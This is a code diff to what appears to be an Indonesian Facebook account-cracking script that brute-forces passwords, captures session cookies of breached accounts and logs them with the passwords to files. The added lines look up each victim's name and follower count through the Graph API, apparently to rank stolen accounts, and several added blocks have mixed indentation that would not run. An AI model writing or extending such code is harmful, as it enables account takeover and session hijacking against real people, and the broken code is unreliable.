@@ -751,7 +751,26 @@ def passwordlist():
 	print(f'{biru}└──[{puti} OK {hijo}: %s'%(ok))
 	print(f'{biru}└──[{puti} CP {kun}: %s'%(cp))
 	print(f"{biru}─────────────────────────────────────────────{puti}")
-	
+import requests
+
+def get_facebook_info(user_id, access_token):
+    urlb = f"https://graph.facebook.com/{user_id}?fields=name,followers&access_token={access_token}"
+    response = requests.get(urlb)
+    data = response.json()
+    if 'error' in data:
+        print("Error:", data['error']['message'])
+    else:
+        name = data.get('name', 'N/A')
+        followers_count = data.get('followers', {}).get('summary', {}).get('total_count', 'N/A')
+        print(f"Name: {name}")
+        print(f"Followers: {followers_count}")
+
+# Masukkan ID pengguna Facebook yang ingin Anda cari
+user_id = input("Masukkan ID pengguna Facebook: ")
+# Ganti dengan token akses yang Anda dapatkan dari Facebook Developer Dashboard
+access_token = "your_access_token_here"
+
+get_facebook_info(user_id, access_token)
 #----------[ METODE-VALIDATE ]----------#	
 def crackvalidate(idf,pwx,url):
 	global loop,ok,cp
@@ -811,7 +830,15 @@ def crackvalidate(idf,pwx,url):
 				ok+=1
 				coki = ses.cookies.get_dict()
 				kuki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";"
-				print(f"\n⌲ User ID: {hijo}{idf}{puti}")
+				token = open('.tok.txt','r').read()
+				urlb = f"https://graph.facebook.com/{idf}?fields=name,followers&access_token={token}"
+				response = requests.get(urlb)
+				data = response.json()
+				name = data.get('name', 'N/A')
+				followers_count = data.get('followers', {}).get('summary', {}).get('total_count', 'N/A')
+				print(f"\n⌲ Name: {hijo}{name}{puti}")
+				print(f"⌲ Followers: {hijo}{followers_count}{puti}")
+				print(f"⌲ User ID: {hijo}{idf}{puti}")
 				print(f"⌲ Password: {hijo}{pw}{puti}")
 				print(f"⌲ Tahun: {mer}{tahun(idf)}{puti}")
 				print(f"⌲ Cookie: {hijo}{kuki}{puti}")
@@ -820,6 +847,14 @@ def crackvalidate(idf,pwx,url):
 				open('CYXIEON-OK/'+'CYXIEON-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
 				break			
 			elif "checkpoint" in po.cookies.get_dict().keys():
+			    token = open('.tok.txt','r').read()
+				urlb = f"https://graph.facebook.com/{idf}?fields=name,followers&access_token={token}"
+				response = requests.get(urlb)
+				data = response.json()
+				name = data.get('name', 'N/A')
+				followers_count = data.get('followers', {}).get('summary', {}).get('total_count', 'N/A')
+				print(f"\n⌲ Name: {hijo}{name}{puti}")
+				print(f"⌲ Followers: {hijo}{followers_count}{puti}")
 				print(f"\n⌲ User ID: {kun}{idf}{puti}")
 				print(f"⌲ Password: {kun}{pw}{puti}")
 				print(f"⌲ Tahun: {mer}{tahun(idf)}{puti}")
@@ -895,6 +930,14 @@ def crackreguler(idf,pwx,url):
 				ok+=1
 				coki = ses.cookies.get_dict()
 				kuki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";"
+				token = open('.tok.txt','r').read()
+				urlb = f"https://graph.facebook.com/{idf}?fields=name,followers&access_token={token}"
+				response = requests.get(urlb)
+				data = response.json()
+				name = data.get('name', 'N/A')
+				followers_count = data.get('followers', {}).get('summary', {}).get('total_count', 'N/A')
+				print(f"\n⌲ Name: {hijo}{name}{puti}")
+				print(f"⌲ Followers: {hijo}{followers_count}{puti}")
 				print(f"\n⌲ User ID: {hijo}{idf}{puti}")
 				print(f"⌲ Password: {hijo}{pw}{puti}")
 				print(f"⌲ Tahun: {mer}{tahun(idf)}{puti}")
@@ -904,6 +947,14 @@ def crackreguler(idf,pwx,url):
 				open('CYXIEON-OK/'+'CYXIEON-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
 				break			
 			elif "checkpoint" in po.cookies.get_dict().keys():
+			    token = open('.tok.txt','r').read()
+				urlb = f"https://graph.facebook.com/{idf}?fields=name,followers&access_token={token}"
+				response = requests.get(urlb)
+				data = response.json()
+				name = data.get('name', 'N/A')
+				followers_count = data.get('followers', {}).get('summary', {}).get('total_count', 'N/A')
+				print(f"\n⌲ Name: {hijo}{name}{puti}")
+				print(f"⌲ Followers: {hijo}{followers_count}{puti}")
 				print(f"\n⌲ User ID: {kun}{idf}{puti}")
 				print(f"⌲ Password: {kun}{pw}{puti}")
 				print(f"⌲ Tahun: {mer}{tahun(idf)}{puti}")
@@ -981,6 +1032,14 @@ def crackasyinc(idf,pwx):
         ok+=1
         coki = po.cookies.get_dict()
         kuki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";"
+        token = open('.tok.txt','r').read()
+        urlb = f"https://graph.facebook.com/{idf}?fields=name,followers&access_token={token}"
+        response = requests.get(urlb)
+        data = response.json()
+        name = data.get('name', 'N/A')
+        followers_count = data.get('followers', {}).get('summary', {}).get('total_count', 'N/A')
+        print(f"\n⌲ Name: {hijo}{name}{puti}")
+        print(f"⌲ Followers: {hijo}{followers_count}{puti}")
         print(f"\n⌲ User ID: {hijo}{idf}{puti}")
         print(f"⌲ Password: {hijo}{pw}{puti}")
         print(f"⌲ Tahun: {mer}{tahun(idf)}{puti}")
@@ -990,6 +1049,14 @@ def crackasyinc(idf,pwx):
         open('CYXIEON-OK/'+'CYXIEON-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
         break	
       elif "checkpoint" in po.cookies.get_dict().keys():
+        token = open('.tok.txt','r').read()
+		urlb = f"https://graph.facebook.com/{idf}?fields=name,followers&access_token={token}"
+		response = requests.get(urlb)
+		data = response.json()
+		name = data.get('name', 'N/A')
+		followers_count = data.get('followers', {}).get('summary', {}).get('total_count', 'N/A')
+		print(f"\n⌲ Name: {hijo}{name}{puti}")
+		print(f"⌲ Followers: {hijo}{followers_count}{puti}")
         print(f"\n⌲ User ID: {kun}{idf}{puti}")
         print(f"⌲ Password: {kun}{pw}{puti}")
         print(f"⌲ Tahun: {mer}{tahun(idf)}{puti}")
